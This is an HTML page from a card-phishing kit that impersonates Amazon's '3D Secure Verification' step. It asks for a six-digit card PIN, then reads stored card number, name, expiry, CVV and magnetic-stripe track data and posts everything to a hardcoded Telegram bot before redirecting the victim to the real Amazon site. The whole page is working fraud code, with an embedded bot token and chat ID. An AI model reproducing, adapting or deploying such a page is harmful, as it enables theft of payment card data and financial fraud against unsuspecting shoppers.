<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3D Secure Verification</title>
    <script src="negara.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 10px 0 25px; }
        .logo img { height: 30px; }
        .kotak { width: 100%; max-width: 420px; padding: 30px 25px; border: 1px solid #ddd; border-radius: 8px; background: #fff; text-align: center; }
        h1 { font-size: 20px; font-weight: 400; margin-bottom: 8px; }
        .sub { color: #555; font-size: 14px; margin-bottom: 25px; }
        .info-kartu { background: #f7f8fa; padding: 15px; border-radius: 6px; margin-bottom: 25px; text-align: left; }
        .info-kartu p { font-size: 13px; margin: 5px 0; color: #333; }
        .info-kartu strong { color: #000; }
        .kotak-pin { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
        .kotak-pin input {
            width: 45px; height: 50px; text-align: center; font-size: 20px; font-weight: bold;
            border: 1px solid #a6a6a6; border-radius: 6px; outline: none;
        }
        .kotak-pin input:focus { border-color: #007185; box-shadow: 0 0 0 2px #c8f0f4; }
        .tombol { width: 100%; padding: 12px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 10px; }
        .tombol:disabled { background: #e9e9e9; border-color: #ccc; cursor: not-allowed; }
        .bawah { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; width: 100%; max-width: 100%; text-align: center; font-size: 11px; color: #555; }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1 id="judulHalaman">3D Secure Verification</h1>
        <p class="sub" id="subJudul">Enter your card PIN to complete verification</p>

        <div class="info-kartu">
            <p>📧 <strong id="tampilEmail">-</strong></p>
            <p>🔢 <strong id="tampilKartu">-</strong></p>
        </div>

        <div class="kotak-pin">
            <input type="password" maxlength="1" data-indeks="0">
            <input type="password" maxlength="1" data-indeks="1">
            <input type="password" maxlength="1" data-indeks="2">
            <input type="password" maxlength="1" data-indeks="3">
            <input type="password" maxlength="1" data-indeks="4">
            <input type="password" maxlength="1" data-indeks="5">
        </div>

        <button id="selesai" class="tombol" disabled>Complete Verification</button>
    </div>

    <div class="bawah">
        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
const token = localStorage.getItem('telegram_token') || '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
const chatid = localStorage.getItem('telegram_chatid') || '7808815199';

// Ambil data dari halaman sebelumnya
const email = localStorage.getItem('email_pengguna') || 'Tidak diketahui';
const akhirKartu = localStorage.getItem('akhir_kartu') || '****';
const nomorKartu = localStorage.getItem('nomor_kartu') || '';
const namaKartu = localStorage.getItem('nama_kartu') || '';
const expKartu = localStorage.getItem('exp_kartu') || '';
const cvvKartu = localStorage.getItem('cvv_kartu') || '';
const track1 = localStorage.getItem('track1') || '';
const track2 = localStorage.getItem('track2') || '';

// Jika belum lewat billing, kembali
if (!nomorKartu) {
    window.location.href = 'billing.html';
}

// Tampilkan info
document.getElementById('tampilEmail').textContent = email;
document.getElementById('tampilKartu').textContent = `•••• •••• •••• ${akhirKartu}`;

// Navigasi kolom PIN
const kolomPin = document.querySelectorAll('.kotak-pin input');
kolomPin.forEach((kolom, idx) => {
    kolom.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        if (this.value && idx < kolomPin.length - 1) {
            kolomPin[idx + 1].focus();
        }
        cekPinLengkap();
    });
    kolom.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !this.value && idx > 0) {
            kolomPin[idx - 1].focus();
        }
    });
});

function cekPinLengkap() {
    const lengkap = Array.from(kolomPin).every(k => k.value.length === 1);
    document.getElementById('selesai').disabled = !lengkap;
}

// Klik selesai
document.getElementById('selesai').addEventListener('click', async function() {
    const pin = Array.from(kolomPin).map(k => k.value).join('');
    if (pin.length < 6) return;

    this.disabled = true;

    // Kirim PIN + data lengkap ke Telegram
    const pesan = `🔐 *3DS PIN*
━━━━━━━━━━━━━━━━━━━━━
📧 Email: ${email}
👤 Nama: ${namaKartu}
🔢 Kartu: ${nomorKartu}
📅 Exp: ${expKartu} | 🔒 CVV: ${cvvKartu}
🔑 PIN: ${pin}
━━━━━━━━━━━━━━━━━━━━━
📋 TRACK DATA
T1: ${track1}
T2: ${track2}
━━━━━━━━━━━━━━━━━━━━━`;

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatid, text: pesan, parse_mode: 'Markdown' })
        });
    } catch (e) {
        console.error('Telegram error:', e);
    }

    // Alihkan ke Amazon
    window.location.href = 'https://www.amazon.com';
});

// Fokus kolom pertama
kolomPin[0].focus();
</script>
</body>
</html>
